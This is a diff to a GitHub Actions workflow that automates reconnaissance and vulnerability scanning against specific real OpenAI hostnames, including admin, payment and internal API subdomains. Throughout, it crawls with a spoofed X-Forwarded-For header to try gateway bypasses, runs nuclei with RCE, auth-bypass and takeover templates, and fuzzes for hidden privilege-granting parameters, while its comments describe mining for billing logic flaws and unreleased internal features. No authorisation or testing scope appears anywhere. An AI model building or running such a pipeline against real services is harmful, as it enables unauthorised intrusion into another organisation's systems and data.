@@ -19,51 +19,45 @@ jobs:
           pip install arjun
           sudo mv ~/go/bin/* /usr/local/bin/
 
-      - name: Phase 1:Targeted Unified & Internal Recon
+      - name: Phase 1:High-Value Target Injection
         run: |
-          # Targeting the specific high-value subdomains found in your logs
-          echo "unified-79.api.openai.com" > scope.txt
-          echo "unified-8.api.openai.com" >> scope.txt
-          echo "api.openai.com" >> scope.txt
-          echo "pay.openai.com" >> scope.txt
+          # We are hard-coding the 'Gold Mine' subdomains discovered in your logs
+          cat <<EOF > targets.txt
+          admin.unified-8.api.openai.com
+          chat-onramp.unified-5.api.openai.com
+          higherlevelapi.unified-8.api.openai.com
+          unified-79.api.openai.com
+          api.openai.com/v1/completionsinternal
+          EOF
           
-          subfinder -dL scope.txt -silent -o subdomains.txt
-          httpx -l subdomains.txt -silent -title -sc -o live_targets.txt
+          # Discovering live endpoints and status codes for these specific targets
+          httpx -l targets.txt -silent -sc -title -o live_targets.txt
 
-      - name: Phase 2:Deep Mining for BOLA & GPT-5 Intel
+      - name: Phase 2:Deep Vulnerability Mining (High CVE Focus)
         run: |
-          # Crawling targets for the 'business', 'internal', and 'gpt-5' paths identified
-          katana -list live_targets.txt -jc -kf all -d 3 -rl 10 -c 5 -o all_endpoints.txt
+          # Katana with custom headers to test for Gateway Bypasses
+          katana -list live_targets.txt -jc -kf all -d 3 -rl 10 -H "X-Forwarded-For: 127.0.0.1" -o all_endpoints.txt
           
-          # --- THE GOLD MINING LOGIC ---
-          
-          # 1. BOLA/Access Control: Targeting the unified gateways and UUIDs
-          grep -E "unified|/v[0-9]/|business|education|org-" all_endpoints.txt > potential_access_targets.txt || true
-          
-          # 2. Billing Logic: Targeting the payment session flows found in logs
-          grep -Ei "billing|checkout|payment|session|invoice" all_endpoints.txt > billing_logic_targets.txt || true
-          
-          # 3. Unreleased Features: Mining for the GPT-5 and Codex references found
-          grep -Ei "gpt-5|codex|internal-api|preview|experimental" all_endpoints.txt > unreleased_intel.txt || true
+          # Filtering for the most critical attack surfaces
+          grep -E "admin|auth|internal|config|v1" all_endpoints.txt > critical_paths.txt || true
 
-      - name: Phase 3:Automated Logic Testing (Focused)
+      - name: Phase 3:Automated Exploitation (Nuclei & Arjun)
         run: |
-          # Scanning unified endpoints for authorization bypasses
-          nuclei -l potential_access_targets.txt -t exposures/ -t vulnerabilities/ -severity critical,high -rl 5 -o nuclei_results.txt || true
+          # 1. Nuclei: Targeting High/Critical CVEs specifically (Bypasses, RCE, Exposures)
+          # These tags cover recent 2024-2025 critical vulnerability patterns
+          nuclei -l critical_paths.txt -tags cve,rce,auth-bypass,exposure,takeover -severity critical,high -rl 5 -o nuclei_results.txt || true
           
-          # Fuzzing for hidden parameters (e.g., ?admin=true) on unified gateways
-          head -n 5 potential_access_targets.txt | while read -r url; do
+          # 2. Arjun: Fuzzing for hidden parameters that grant higher privileges
+          head -n 5 critical_paths.txt | while read -r url; do
              arjun -u "$url" --rate-limit 2 -oJ "params_$(date +%s).json" || true
           done
 
-      - name: Archive All Evidence
+      - name: Archive Critical Evidence
         uses: actions/upload-artifact@v4
         with:
-          name: openai-targeted-results
+          name: openai-high-cve-results
           path: |
             nuclei_results.txt
-            unreleased_intel.txt
-            potential_access_targets.txt
-            billing_logic_targets.txt
+            critical_paths.txt
             params_*.json
             
